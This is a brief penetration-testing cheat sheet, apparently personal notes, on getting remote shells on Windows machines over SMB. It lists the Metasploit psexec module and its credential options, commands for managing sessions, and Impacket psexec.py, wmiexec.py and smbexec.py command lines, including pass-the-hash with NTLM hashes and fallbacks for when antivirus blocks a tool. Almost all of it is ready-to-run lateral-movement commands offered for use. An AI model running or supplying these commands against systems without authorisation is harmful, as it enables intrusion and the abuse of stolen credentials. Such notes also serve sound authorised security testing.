# Gaining Shell Access

## Metasploit (Noisy)

```bash
use exploit/windows/smb/psexec
```

Options:
- `SMBDOMAIN` - Domain/server name
- `SMBPASS` - Password or NTLM hash
- `SMBUSER` - Username to authenticate

Target selection: **Target 2** is usually best (options 0-2 work, 3-4 typically don't).

**Note:** Firewall must be disabled on target for this attack.

### Managing Sessions

```bash
# Background current session
background

# List all sessions
sessions

# Interact with session
sessions -i SESSION_ID
```

This allows running multiple shells/exploits simultaneously (basic C2 functionality).

## Impacket Tools (Quieter)

### psexec.py

```bash
psexec.py domain/username:'password'@TARGET_IP

# With hash
psexec.py domain/username@TARGET_IP -hashes LMHASH:NTHASH
```

### Alternatives

If psexec.py fails or AV blocks it:

```bash
wmiexec.py domain/username:'password'@TARGET_IP
smbexec.py domain/username:'password'@TARGET_IP
```

Choice depends on target machine configuration.
